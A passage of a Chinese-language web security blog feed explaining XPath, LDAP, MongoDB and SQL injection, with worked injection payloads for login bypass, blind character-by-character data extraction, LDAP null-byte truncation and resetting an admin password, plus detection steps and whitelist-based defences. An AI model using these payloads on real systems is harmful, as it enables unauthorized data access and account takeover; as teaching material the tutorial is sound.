class="name">password</span>&gt;</span>secret!<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>cdawes@craftnet.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ccard</span>&gt;</span>3981 2491 3241 3121<span class="tag">&lt;/<span class="name">ccard</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>James<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">surname</span>&gt;</span>Hunter<span class="tag">&lt;/<span class="name">surname</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>letmein<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>james.hunter@pookmail.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ccard</span>&gt;</span>8113 8320 8014 3313<span class="tag">&lt;/<span class="name">ccard</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">addressBook</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个获取所有电子邮件地址的XPath查询如下：</p>
<p><strong>//address/email/text()</strong></p>
<p>一个返回Dawes的全部用户资料的查询为：</p>
<p><strong>//address[surname/text() = ‘Dawes’]</strong></p>
<p>在一些应用程序中，用户提交的数据可被直接嵌入到XPath查询中，查询的结果可能在应用程序的响应中返回，或者用于决定应用程序某些方面的行为。</p>
<h3 id="破坏应用程序逻辑"><a href="#破坏应用程序逻辑" class="headerlink" title="破坏应用程序逻辑"></a>破坏应用程序逻辑</h3><p>以一个根据用户名和密码获得用户保存的信用卡号码的应用程序功能为例。下面的XPath查询核实用户提交的整数，并获取相关用户的信用卡号码：</p>
<p><strong>//address[surname/text()=’Dawes’ and password/text() = ‘secret’]/ccard/text()</strong></p>
<p>与利用SQL注入漏洞一样，这时攻击者也可以破坏应用程序的查询。例如，提交密码值</p>
<p><strong>‘ or ‘a’=’a</strong></p>
<p>将导致下面的XPath查询，获取所有用户的信用卡信息：</p>
<p><strong>//address[surname/text() = ‘Dawes’ and password/text() = ‘’ or ‘a’ = ‘a’]/ccard/text()</strong></p>
<p>另外，与SQL注入一样，注入一个数字值时不需要单引号。但与SQL查询不同，XPath查询中的关键字区分大小写，XML文档中的元素名也区分大小写。</p>
<h3 id="谨慎XPath注入"><a href="#谨慎XPath注入" class="headerlink" title="谨慎XPath注入"></a>谨慎XPath注入</h3><p>攻击者可利用Xpath注入漏洞从目标XML文档中获取任意信息。获取信息的一种可靠途径是使用和上述SQL注入时相同的技巧，促使应用程序根据攻击者指定的条件以不同的方式作出响应。</p>
<p>提交以下两个密码将导致应用程序的不同行为：第一种情况返回结果，但第二种情况不返回结果。</p>
<p><strong>‘ or 1 = 1 and ‘a’ = ‘a</strong></p>
<p><strong>‘ or 1 = 2 and ‘a’ = ‘a</strong></p>
<p>这种行为差异可用于测试任何特殊条件的真假，因此可通过它依次第一个字节地提取出任意信息。与SQL一样，XPath语言也包含一个子字符串函数，可用它依次一个字符地测试一个字符串的值。例如，提交密码</p>
<p><strong>‘ or //address[surname/text()=’Gates’ and substring(password/text(), 1, 1) = ‘M’] and ‘a’ = ‘a</strong></p>
<p>将导致下面的XPath查询，如果用户Gates密码的第一个字符为M，将返回查询结果：</p>
<p><strong>//address[surname/text()=’Dawes’ and password/text() = ‘’ or //address[surname/text() = ‘Gates’ and substring(password/text(), 1, 1) = ‘M’] and ‘a’ = ‘a ‘]/ccard/text()</strong></p>
<p>轮流针对每个字符为止并测试每个可能的值，攻击者就能够获得Gate的完整密码。</p>
<h3 id="盲目XPath注入"><a href="#盲目XPath注入" class="headerlink" title="盲目XPath注入"></a>盲目XPath注入</h3><p>在前面的攻击中，注入的测试条件指定了提取数据的绝对路径以及目标字段的名称。实际上，即使不了解这些信息，攻击者仍有可能发动完全盲目的攻击。Xpath查询可包括与XML文档中当前节点的有关步骤，因此，从当前节点可以导航到父节点或一个特定的子节点。另外，XPath包含可查询文档原信息（包含特殊元素的名称）的函数。使用这些技巧就可以提取出文档中所有节点的名称与之，而不必提前知道与它的结构或内容有关的任何信息。</p>
<p>例如，可以使用前面描述的子字符串技巧，通过提交如下格式的密码，提取当前节点的父节点名称：</p>
<p><strong>‘ or substring(name(parent::*[position() = 1]), 1, 1) = ‘a</strong></p>
<p>这个输入能够返回结果，因为address节点的第一个字母为a。轮到第二个字母，这时可以提交下列密码确定该字母为d，因为最后一个输入返回了结果：</p>
<p><strong>‘ or substring(name(parent::*[position()=1]),2,1) = ‘a</strong></p>
<p><strong>‘ or substring(name(parent::*[position()=1]),2,1) = ‘b</strong></p>
<p><strong>‘ or substring(name(parent::*[position()=1]),2,1) = ‘c</strong></p>
<p><strong>‘ or substring(name(parent::*[position()=1]),2,1) = ‘d</strong></p>
<p>确定address节点的名称后，攻击者就可以轮流攻击他的每一个子节点，提取出它们的名称与值。通过索引指定相关子节点可不必知道任何节点的名称。例如，下面的查询将返回值Hunter：</p>
<p><strong>//address[position() = 3]/child::node()[position*() = 4]/text()</strong></p>
<p>而下面的查询返回值letmein：</p>
<p><strong>//address[position() = 3]/child::node()[position*() = 6]/text()</strong></p>
<p>这种技巧可用在完全盲目的攻击中，这时应用程序在响应中不返回任何结果，我们可以设计一个注入的条件，通过索引指定目标节点。例如，如果Gates密码的第一个字母为M，提交下面的密码将返回结果：</p>
<p><strong>‘ or substring (//address[position()=1]/child::node()[position() = 6]text(), 1, 1) = ‘M’ and ‘a’ = ‘a</strong></p>
<p>轮流攻击每个地址节点的每个子节点，并以此一个字符地提取出它们的值，攻击者就可以提取整个XML数据的内容。</p>
<h3 id="查找XPath注入漏洞"><a href="#查找XPath注入漏洞" class="headerlink" title="查找XPath注入漏洞"></a>查找XPath注入漏洞</h3><p>许多常用于探查SQL注入漏洞的攻击字符串如果被提交给一个易于受到XPath注入的函数，往往会导致反常行为。例如，下面的两个字符会破坏XPath查询的语法，从而造成错误：</p>
<p><strong>‘</strong></p>
<p><strong>‘–</strong></p>
<p>通常，与在SQL注入漏洞中一样，下面的一个或几个字符串将会引起应用程序的行为发生变化，但不会造成错误：</p>
<p><strong>‘ or ‘a’ = ‘a</strong></p>
<p><strong>‘ and ‘ a’ = ‘b</strong></p>
<p><strong>or 1 = 1</strong></p>
<p><strong>and 1=2</strong></p>
<p>因此，任何时候，如果在探查SQL注入过程中发现一个漏洞的初步证据，但却无法对该漏洞加以利用，那么遇到的可能就是XPath注入漏洞。</p>
<h3 id="防止XPath注入"><a href="#防止XPath注入" class="headerlink" title="防止XPath注入"></a>防止XPath注入</h3><p>如果觉得必须在一个XPath查询中插入用户提交的输入，应该只提交可事实严格输入确认的简单数据。应根据一份可接受字符组成的“白名单”检查用户输入，其中最好只包括字母数字字符。应阻止任何可能破坏XPath查询的字符，包括( ) = ‘ [ ] : , * / 和所有空白符。直接拒绝而不是净化任何与白名单不匹配的输入。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>XPath</tag>
      </tags>
  </entry>
  <entry>
    <title>注入LDAP</title>
    <url>/2019/03/25/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-5%E6%B3%A8%E5%85%A5LDAP/</url>
    <content><![CDATA[<h1 id="注入LDAP"><a href="#注入LDAP" class="headerlink" title="注入LDAP"></a>注入LDAP</h1><p>LDAP（LightWeight Directory Access Protocol， 轻量级目录访问协议）用于访问网络中的目录服务。目录是一个分级结构的数据存储区，其中可能包含任何类型的信息，但常用于保存个人信息，如姓名、电话号码、电子邮件地址和工作职能等。Windows域中使用的Active Directory就是这种目录的一个典型示例。LDAP还常用在企业内联网Web应用程序中，如允许用户查看并修改雇员信息的人力资源应用程序。</p>
<p>每个LDAP查询使用一个或多个搜索过滤器，它们决定了请求返回的目录项。搜索过滤器可以使用各种逻辑运算符来表示复杂的搜索条件。最常用的搜索过滤器如下。</p>
<ul>
<li><p><strong>简单匹配条件</strong>对单个属性的值进行匹配。例如，通过用户名搜索用户的应用程序可能使用以下过滤器：</p>
<p><strong>（username=daf）</strong></p>
</li>
<li><p><strong>析取查询</strong>指定多个条件，返回的目录项必须满足其中任何一个条件。例如，在多个目录属性中查找用户提供的搜索项的搜索函数可能使用以下过滤器：</p>
<p><strong>(|(cn=searchterm) (sn=searchitem)(ou=searchterm))</strong></p>
</li>
<li><p><strong>合取查询</strong>指定多个条件，返回的目录项必须满足所有这些条件。例如，LDAP中实施的登录机制可能使用以下过滤器：</p>
<p><strong>(&amp;(username=daf)(password=secret))</strong></p>
</li>
</ul>
<p>和其他形式的注入一样，如果用户提交的输入不经任何确认即被插入到LDAP搜索过滤器中，攻击者就可以通过提交专门设计的输入来修改过滤器的结构，以检索数据或执行未授权操作。</p>
<p>一般而言，与SQL注入漏洞相比，LDAP注入漏洞更难以被攻击者利用，原因如下。</p>
<ul>
<li>搜索过滤器采用逻辑运算符来指定析取或合取查询的位置通常位于用户提交数据的插入位置之前，因而无法被修改。因此，简单匹配条件和合取查询不会受与SQL注入类似的“ or 1=1”类型的攻击。</li>
<li>在常用的LDAP服务中，范湖IDE目录属性将作为搜索过滤器中的独立参数传递个LDAP API，并且通常在应用程序中进行了硬编码。因此，攻击者无法通过修改用户提交的输入来检索与查询检索的属性不同的属性。</li>
<li>应用程序很少返回有用的错误消息，因此，通常攻击者只能“盲目”利用各种漏洞。</li>
</ul>
<h2 id="利用LDAP注入"><a href="#利用LDAP注入" class="headerlink" title="利用LDAP注入"></a>利用LDAP注入</h2><p>尽管存在上述限制，但在许多情况下，攻击者仍然可以利用LDAP注入漏洞从应用程序中获取数据，或执行未授权操作。通常，实施这类攻击的方法与搜索过滤器的结构、用户输入的进入点，以及后端LDAP服务本身的执行细节密切相关。</p>
<h3 id="析取查询"><a href="#析取查询" class="headerlink" title="析取查询"></a>析取查询</h3><p>以允许用户查看指定业务部门的雇员的应用程序为例。其搜索结果仅限于用户获得授权可以查看的地理区域。例如，如果一名用户获得授权可以查看伦敦和雷丁区域，并且他搜索的是“销售”部门，应用程序将执行以下析取查询：</p>
<p><strong>(|(department=London sales)(department=Reading sales))</strong></p>
<p>这里应用程序构建了一个析取查询，并在用户提交的输入之前前置了一些表达式来执行所需的访问控制。</p>
<p>在这种情况下，攻击者可以通过提交以下搜索项对查询进行修改，以返回所有地区的所有雇员的资料：</p>
<p><strong>)(department=*</strong></p>
<p>*字符是LDAP中的通配符，可匹配任何数据项。如果将这个输入嵌入LDAP搜索过滤器中，应用程序将执行以下查询：</p>
<p><strong>(|(department=London )(department=*)(department=Reading )(department=*))</strong></p>
<p>由于这是一个析取查询并且包含通配符搜索项，因此，它会对所有目录项进行匹配。它会返回所有地区的所有员工的资料，从而突破应用程序的访问控制。</p>
<h3 id="合取查询"><a href="#合取查询" class="headerlink" title="合取查询"></a>合取查询</h3><p>这里我们以另一个类似的应用程序为例，同样，该应用程序允许用户按姓名在授权查看的地理区域内搜索雇员。</p>
<p>如果用户获得授权可以在伦敦进行搜索，并且他搜索姓名daf，则应用程序将执行以下查询：</p>
<p><strong>(&amp;(giveName=daf)(department=London*))</strong></p>
<p>这里，用户的输入被插入到合取查询中，该查询的第二部分仅通过匹配其中一个伦敦部门的数据项来执行所需的访问控制。</p>
<p>在这种情况下，根据后端LDAP服务的执行细节，攻击者可以成功实施两种类型的攻击。一些LDAP允许批量使用多个搜索过滤器，并且选择性地应用这些过滤器（换言之，应用程序将返回与任意过滤器匹配的目录项）例如，攻击者可以提交以下输入：</p>
<p><strong>*))(&amp;giveName=daf</strong></p>
<p>如果将这个输入嵌入原始搜索过滤器中，将得到以下查询：</p>
<p><strong>(&amp;(giveName=*))(&amp;giveName=daf)(department=London*)</strong></p>
<p>现在，这个查询中包含两个搜索过滤器，第一个过滤器包含一个通配符匹配条件。因此，应用程序将返回所有地区的所有雇员的资料，从而避开了应用程序的访问控制。</p>
<p>第二种针对合取查询的额共计利用许多LDAP服务在处理NULL字节方面存在的漏洞。由于这些服务通常以本地代码编写，因此，搜索过滤器中的NULL字节将立即终止字符串，NULL之后的任何字符将被忽略。虽然LDAP本身并不支持注释，但是，攻击者可以利用它在处理NULL字节上的这个漏洞，从而“注释掉”查询的剩余部分。</p>
<p>在前一个示例中，攻击者可以提交以下输入：</p>
<p><strong>*))%00</strong></p>
<p>应用程序服务器会将%00序列解码成原义NULL字节，因此，如果将以上输入嵌入到搜索过滤器中，查询将变为：</p>
<p><strong>(&amp;(giveName=<em>))[NULL](department=London\</em>)</strong></p>
<p>由于这个过滤器在NULL字节处被截短，在LDAP看来，其中只包含一个通配符条件，因此，应用程序还会返回伦敦地区以外的部门的所有雇员资料。</p>
<h3 id="查找LDAP注入漏洞"><a href="#查找LDAP注入漏洞" class="headerlink" title="查找LDAP注入漏洞"></a>查找LDAP注入漏洞</h3><p>向一项LDAP操作提交武侠ode输入并不会生成任何详细的错误消息。通常，由搜索功能返回的结果和发生的错误都有助于确定漏洞。但是，可以使用以下步骤相对可靠的确定LDAP注入漏洞。</p>
<ol>
<li><p>尝试仅输入*字符作为搜索项。在LDAP中，这个字符是一个通配符，但在SQL中不是，如果返回大量结果，这种情况明显表示攻击针对的是一个LDAP查询</p>
</li>
<li><p>尝试输入大量的闭括号：</p>
<p><strong>)))))))</strong></p>
<p>这个输入将结束任何括住输入、以及那些包含主查询过滤器的括号，导致无法匹配的闭括号，因而破坏查询的语法。如果发生错误，应用程序就易于受到LDAP注入。</p>
</li>
<li><p>尝试输入各种旨在干扰不同类型的查询的表达式，并看是否可以通过这些表达式来影响返回的结果。所有LDAP均支持cn属性，如果对所查询的目录一无所知，使用该属性会大有用处。例如：</p>
<p><strong>)(cn=*</strong></p>
<p><strong><em>))(|(cn=\</em></strong></p>
<p><strong>*))%00</strong></p>
<h3 id="防止LDAP注入"><a href="#防止LDAP注入" class="headerlink" title="防止LDAP注入"></a>防止LDAP注入</h3><p>如果有必要在一个LDAP查询中插入用户提交的输入，也只提交可事实严格输入确认的简单数据。应根据一份可接受字符“白名单”检查用户输入，其中最好只包括字母数字字符。应组织任何可能破坏LDAP查询的字符，包括 ( ) ; , * | &amp; = 和空字节。拒绝任何与白名单不匹配的输入，不要净化。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>LDAP</tag>
      </tags>
  </entry>
  <entry>
    <title>注入NoSql</title>
    <url>/2019/03/24/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-3%E6%B3%A8%E5%85%A5NoSQL/</url>
    <content><![CDATA[<h1 id="注入NoSql"><a href="#注入NoSql" class="headerlink" title="注入NoSql"></a>注入NoSql</h1><p>术语NoSQL用于指各种不同于标准的关系数据库体系架构的数据存储区。NoSQL数据存储区呈现使用键/值映射的数据，并且不依赖于固定的方案，如传统的数据库表。键和值可以任意定义，而且值的格式通常与数据存储区无关。键/值存储的另一个特点在于，值可能为数据结构本身，因而可以实现层次化存储，这与数据库方案中的平面数据结构不同。</p>
<p>支持上述数据存储的NoSQL具有各方面的优势，这些优势主要体现在处理庞大的数据集方面，以便于根据需要对数据存储区中的层次化数据进行优化，以减少检索数据集的开销。在这些情况下，传统的数据库可能需要对表进行复杂的交叉引用，才能代表应用程序检索信息。</p>
<p>从Web应用程序安全的角度看，我们主要关注应用程序如何查询数据，因为这决定了攻击者可以进行何种形式的注入。就SQL注入而言，不同数据库产品采用的SQL语言答题相似。相反，NoSQL代表着一类全新的数据存储区，它们的行为各不相同。而且，它们并非全部使用单一的查询语言。</p>
<p>以下是NoSQL数据存储区采用的一些常用的查询方法：</p>
<ul>
<li>键/值查询</li>
<li>XPath</li>
<li>编程语言</li>
</ul>
<p>NoSQL是一种快速发展的相对较新的技术。与SQL等比较成熟的技术不同，它并没有进行大规模部署。因此，对于NoSQL相关漏洞的研究仍处于早期阶段。此外，由于许多NoSQL技术访问数据的方式十分简单，讨论注入NoSQL数据存储区的示例有时候明显是虚构的。</p>
<p>几乎可以肯定的是，当前和将来的Web应用程序使用NoSQL数据存储区的方式将存在可被利用的漏洞。</p>
<h3 id="注入MongoDB"><a href="#注入MongoDB" class="headerlink" title="注入MongoDB"></a>注入MongoDB</h3><p>许多NoSQL数据库利用现有的编程语言来提供灵活、可编程的查询机制。如果使用字符串连接构建查询，攻击者就可以尝试破坏数据并更改查询的语法。以下面的查询为例，它基于MongoDB数据存储区中的用户记录进行登录：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$m = <span class="keyword">new</span> Mongo();</span><br><span class="line">$db = $m-&gt;cmsdb;</span><br><span class="line">$collection = $db -&gt; user;</span><br><span class="line">$js = <span class="string">"function() &#123;return this.username = '$username' &amp; this.password = '$password';&#125;"</span>;</span><br><span class="line">$obj = $collection-&gt;findone(array(<span class="string">'where'</span> =&gt; $js));</span><br><span class="line"><span class="keyword">if</span> (isset($obj[<span class="string">"uid"</span>])) &#123;</span><br><span class="line">    $logged_in = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $logged_in = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$js是一个JavaScript函数，其代码是动态构建的，并且包含用户提交的用户名和密码。攻击者可以通过提供以下用户名和任意密码来避开验证逻辑：</p>
<p><strong>Marcus’//</strong></p>
<p>生成的JavaScript函数如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>.username = <span class="string">'marcus'</span><span class="comment">//' &amp; this.password = 'aaa';&#125;</span></span><br></pre></td></tr></table></figure>

<p>在JavaScript中，双正斜杠（//）表示行尾注释，因此，函数中的剩余代码将被注释掉。另一种不使用注释而确保$js函数始终返回为“真”的方法，是提供以下用户名：</p>
<p><strong>a’ || 1 == 1 || ‘a’ == ‘a</strong></p>
<p>JavaScript以如下方式解释各种运算符：</p>
<p><strong>(this.username = ‘a’ || 1 == 1) || (‘a’ == ‘a’ &amp; this.password == ‘aaa’);</strong></p>
<p>这将匹配用户集合中的所有资源，因为第一个选择性条件始终为真（1始终等于1）。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>NoSql</tag>
      </tags>
  </entry>
  <entry>
    <title>注入sql</title>
    <url>/2019/03/23/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-2%E6%B3%A8%E5%85%A5SQL/</url>
    <content><![CDATA[<h1 id="注入SQL"><a href="#注入SQL" class="headerlink" title="注入SQL"></a>注入SQL</h1><p>数据库中的信息通过SQL（Structured Query Language，结构化查询语言）访问。SQL可用于读取、更新、增加或删除数据库中保存的信息。</p>
<p>SQL是一种解释型语言，Web应用程序经常建立合并用户提交的数据的SQL语句。因此，如果建立语句的方法不安全，那么应用程序可能易于受到SQL注入攻击。</p>
<h2 id="利用一个基本的漏洞"><a href="#利用一个基本的漏洞" class="headerlink" title="利用一个基本的漏洞"></a>利用一个基本的漏洞</h2><p>下面以一个书籍零售商使用的Web应用程序为例，该应用程序允许用户根据作者、书名、出版商等信息搜索产品。完整的书籍目录保存在数据库中，应用程序使用SQL查询、根据用户提交的搜索项获取各种书籍的信息。</p>
<p>当一名用户搜索由Wiley出版的所有书籍时，应用程序执行以下查询：</p>
<p><strong>SELECT author, title, year FROM books WHERE publisher = ‘Wiley’ and published = 1</strong></p>
<p>该查询要求数据库检查书籍表的每一行，提取每条publisher列为wiley值的记录，并返回所有这些记录。然后应用程序处理这组记录，并通过一个HTML页面将结果显示给用户。</p>
<p>在这个查询中，等号左边的词由SQL关键字、表和数据库列名称构成。这个部分的全部内容由程序员在创建应用程序时建立。当然，表达式wiley由用户提交，它是一个数据项。SQL查询中的字符串数据必须包含在单引号内，与查询的其他内容隔开来。</p>
<p>现在思考一下，如果用户搜索所有由O’Reilly出版的书籍，会出现什么情况。应用程序将执行以下查询：</p>
<p><strong>SELECT author, title, year FROM books WHERE publisher = ‘O’Reilly’ and published = 1</strong></p>
<p>在这个示例中，查询解释器以和前一个示例相同的方式到达字符串数据位置。它解析这个包含在单引号中的数据，得到值O。然后遇到表达式Reilly’，这并不是有效的SQL语法，因此，应用程序生成一条错误信息：</p>
<p><strong>Incorrect syntax near ‘Reilly’.</strong></p>
<p><strong>Server: Msg 105,Level 15, State 1, Line1</strong></p>
<p>*<em>Unclosed quotation mark before the  character string ‘ *</em></p>
<p>如果应用程序以这种方式运行，那么它非常容易遭到SQL注入。攻击者可提交包含引号的输入终止它控制的字符串，然后编写任意的SQL修改开发者想要的应用程序执行的查询。例如，在这个示例中，攻击者可以对查询进行修改，通过以下输入项，返回零售商目录中的每一本书籍。</p>
<p><strong>Willey’ OR 1=1–</strong></p>
<p>应用程序将执行以下查询：</p>
<p><strong>SELECT author, title, year, FROM books WHERE publisher = ‘Willey’ OR 1=1 –’ AND published = 1</strong></p>
<p>这个查询对开发者查询中的WHERE子句进行修改，增加了另外一个条件。数据库将检查书籍表的每一行，提取publisher列值位Willey<strong>或其中1=1</strong>的每一条记录。因为1总是等于1，所以数据库将返回书籍表中的所有记录。</p>
<p>攻击者的输入中的双连字符在SQL中是一个有意义的表达式，它告诉查询解释器该行的其他部分属于注释，应被忽略。在一些SQL注入攻击中，这种技巧机器重要，因为它允许忽略由应用程序开发者建立的查询的剩余部分。在MySQL中，需要在双连字符后加入一个空格，或者使用<strong>“#”</strong>符号指定注释。</p>
<p>有些时候，可以不使用注释符号处理字符串末尾部分的引号，而用一个需要引号包含的字符串数据结束注入的输入，依次<strong>“平衡引号”</strong>，例如，输入以下搜索项：</p>
<p><strong>willey’ or ‘a’ = ‘a</strong></p>
<p>将生成以下查询：</p>
<p><strong>SELECT author, title,year FROM books where publisher = ‘willey’ OR ‘a’ = ‘a’ and publisher = 1</strong></p>
<p>这个查询完全有效，可得到和1=1攻击相同的效果。 </p>
<h2 id="注入不同的语句类型"><a href="#注入不同的语句类型" class="headerlink" title="注入不同的语句类型"></a>注入不同的语句类型</h2><p>当然，当与一个远程应用程序交互时，通常情况下不可能提前知道用户输入的一个特殊数据项将由哪种类型的语句处理。但是，可以根据使用的应用程序功能进行合理地猜测。</p>
<h3 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h3><p>SELECT语句被用于从数据库中获取信息。它们常用于应用程序响应用户操作而返回信息的功能中，如浏览一个产品目录、查看一名用户的资料或者进行一项搜索。根据数据库中的数据核对用户提交的信息的登录功能也经常使用这种语句。</p>
<p>如在前面的示例中说明的，SQL注入攻击的进入点（entry point）通常是查询中的WHERE子句，它将用户提交的数据传送给数据库，以控制查询结果的范围。因为WHERE子句一般在SELECT语句的最后，攻击者就可以使用注释符号将查询阶段到其输入的结束位置，而不会使整个查询的语法失效。</p>
<p>SQL注入漏洞偶尔也会影响SELECT查询的其他部分，如ORDER BY子句或表和列名称。</p>
<h3 id="INSERT语句"><a href="#INSERT语句" class="headerlink" title="INSERT语句"></a>INSERT语句</h3><p>INSERT语句用于在表中建立一个新的数据行。应用程序通常使用这种语句添加一条新的审计日志、创建一个新用户账户或生成一个新订单。</p>
<p>例如，如果一个应用程序允许用户自我注册， 指定它们自己的用户名和密码，就可以使用下面的语句将用户资料插入user表中。</p>
<p><strong>INSERT INTO users (username, password, ID, privs) VALUES (‘daf’, ‘secret’, 2248, 1)</strong></p>
<p>如果username或password字段存在SQL注入漏洞，那么攻击者就可以在表中插入任何数据，包括他自己的ID和privs值。然而，要想这样做，攻击者就必须确保VALUES子句的其他部分正常运行。特别是其中数据项的个数和类型必须正确。例如，当注入username字段时，攻击者可以提交以下输入：</p>
<p><strong>foo’, ‘bar’, 9999, 0)–</strong></p>
<p>它将建立一个ID为9999，privs为0的账户。加入privs字段用来决定账户权限，那么攻击者可以利用它创建的一个管理用户。</p>
<p>有时，攻击者完全盲目地注入一个INSERT语句也能够从应用程序中提取出字符串数据。例如，攻击者可以拦截数据库的版本字符串，并将它插入自己用户资料的一个字段中；正常情况下，浏览器将显示数据库的版本信息。</p>
<p>当设法注入一个INSERT语句时，可能无法提前知道需要提交多少个参数或参数的类型。在前面的示例中，可以通过在VALUES子句中持续增加一个新的字段，知道应用程序创建了确实想要的用户账户，从而解决上述问题。例如，当注入username字段时，可以提交以下输入：</p>
<p><strong>Foo’)–</strong></p>
<p><strong>Foo’, 1)–</strong></p>
<p><strong>Foo’, 1, 1)–</strong></p>
<p><strong>Foo’, 1, 1, 1)–</strong></p>
<p>由于大多数数据库都会隐式地讲一个整数转换为字符串，可以在每个位置都是用一个整数。在这个示例中，不管其他字段如何，它将生成一个用户名为Foo、密码为1的账户。</p>
<p>如果发现使用值1人员遭到拒绝，可以尝试使用值2000，许多数据库也会隐式地将它转换成基于数据的数据类型。</p>
<p>确定注入点之后的正确字段数后，在MS-SQL中，测试员可以任意添加另外一个查询，并采用后面将介绍的基于推断的技巧。</p>
<p>在Oracle中，则可以在insert查询内发布subselect查询。使用后面基于推断的技巧，该subselect查询可能导致主查询成功或失败。</p>
<h3 id="update语句"><a href="#update语句" class="headerlink" title="update语句"></a>update语句</h3><p>UPDATE语句用于修改表中的一行或几行数据。它们经常用在用户修改已有数据值的功能中，例如，更新联系信息、修改密码或更改订单数量。</p>
<p>典型UPDATE语句的运行机制和INSERT语句类似，只是UPDATE语句中通常包含一个WHERE子句，告诉数据库更新表中哪些行的数据。例如，当用户修改密码时，应用程序可能会执行以下查询：</p>
<p><strong>UPDATE users SET password=’newsecret’ WHERE user = ‘marcus’ and password = ‘secret’</strong></p>
<p>实际上，这个查询首先合适用户的现有密码是否争取，如果密码无误，就用新的值更新它。如果这项功能存在SQL注入漏洞，那么攻击者就能避开现有密码检查，通过输入以下用户名更新管理员的密码：</p>
<p><strong>admin’–</strong></p>
<p>由于无法提前知道应用程序将根据专门设计的输入执行什么操作，因此，在一个远程应用程序中探查SQL注入漏洞往往非常危险。特别注意，修改UPDATE语句中的WHERE子句可能会使一个重要的数据库表发生彻底的改变。例如，上面的攻击者之前已经提交了以下用户名：</p>
<p><strong>admin’ or 1 = 1</strong></p>
<p>那么应用程序可能会执行以下查询：</p>
<p><strong>UPDATE users SET password = ‘newsecret’ where user = ‘admin’ or 1 = 1</strong></p>
<p>它会重新设置每一名用户的密码。</p>
<h3 id="DELETE语句"><a href="#DELETE语句" class="headerlink" title="DELETE语句"></a>DELETE语句</h3><p>DELETE语句用于删除表中的一行或几行数据，例如，用户从他们的购物篮中删除意见商品或从个人资料中删除一个交货地址。</p>
<p>与UPDATE语句一样，DELETE语句通常使用WHERE子句告诉数据库更新表中哪些行的数据，并很可能在这个子句中并入用户提交的数据。破坏正常运行的WHERE子句可能会造成严重的后果。</p>
<h2 id="查明SQL注入漏洞"><a href="#查明SQL注入漏洞" class="headerlink" title="查明SQL注入漏洞"></a>查明SQL注入漏洞</h2><p>在最明显的情形中，只需向应用程序提交一个意外输入，就可以发现并最终确定一个SQL注入漏洞。在其他情况下，这种缺陷可能非常微妙，很难与其他类型的漏洞或不会造成安全威胁的“良性”异常区分开来。但是，可以按顺序采取各种步骤查明绝大多数的SQL注入漏洞。</p>
<p>在探查SQL注入漏洞时，一定要确保完全遍历任何可以提交专门设计的输入的多阶段过程。应用程序通常会从几个请求中收集一组数据，一旦收集到全部的数据，就将其保存在数据库中。这时，如果仅在每个请求中提交专门设计的数据并监控应用程序对那个请求的响应，就会遗漏许多SQL注入漏洞。</p>
<h3 id="注入字符串数据"><a href="#注入字符串数据" class="headerlink" title="注入字符串数据"></a>注入字符串数据</h3><p>如果SQL查询合并用户提交的数据，它会将这些数据包含在单引号中。为利用任何SQL注入漏洞，攻击者需要摆脱这些引号的束缚。</p>
<p>测试步骤：</p>
<ol>
<li>提交一个单引号作为目标查询的数据。观察是否会造成错误，或结果是否与原始结果不同。如果收到详细错误信息，了解该信息的含义。</li>
<li>如果发现错误或其他异常行为，同时提交两个单引号，看会出现什么情况。数据库使用两个单引号作为转义序列，表示一个原义单引号，因此这个序列被解释称引用字符串中的数据，而不是结束字符串的中支付。如果这个输入导致错误或异常行为消失，则应用程序可能易于受SQL注入攻击。</li>
<li>为进一步核实漏洞是否存在，可以使用SQL连接符建立一个等同于“良性”输入的字符串。如果应用程序以与处理对应“良性”输入相同的方式处理专门设计的输入，那么它很可能易于受到攻击。每种数据库使用的字符串连接方法各不相同。在易受攻击的应用程序中，可以注入以下示例构建等同于FOO的输入：<ul>
<li>Oracle： ‘||’FOO</li>
<li>MS-SQL: ‘+’FOO</li>
<li>MySQL: ‘ ‘FOO [两个单引号之间有一个空格]</li>
</ul>
</li>
</ol>
